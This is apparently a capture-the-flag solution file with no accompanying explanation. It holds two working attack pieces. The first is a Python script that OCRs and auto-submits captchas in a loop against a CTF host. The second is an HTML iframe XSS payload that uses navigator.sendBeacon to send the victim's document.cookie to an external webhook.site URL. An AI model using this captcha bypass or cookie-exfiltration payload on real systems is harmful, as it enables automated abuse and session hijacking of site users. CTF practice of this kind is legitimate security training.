import re
import requests
from PIL import Image
import pytesseract
import io
import base64

s = requests.Session()
url = "https://captcha1.uctf.ir"

while True:
        r = s.get(url)
        pattern = r'data:image\/\w+;base64,([^"]+)'
        match = re.search(pattern, r.text)
        image_data = base64.b64decode(match.group(1))
        image = Image.open(io.BytesIO(image_data))
        ocr_text = pytesseract.image_to_string(image)
        print(r.text)
        print(s.cookies.get_dict())
        sendit=s.post(url,data={'captcha':ocr_text})


<iframe
  name="body"
  srcdoc="<a id=togglePopover href=foobar:if(!window.sent)window.sent=navigator.sendBeacon('https://webhook.site/2b07a131-de46-4153-beaf-406c2e5819a2',document.cookie)></a>"
></iframe>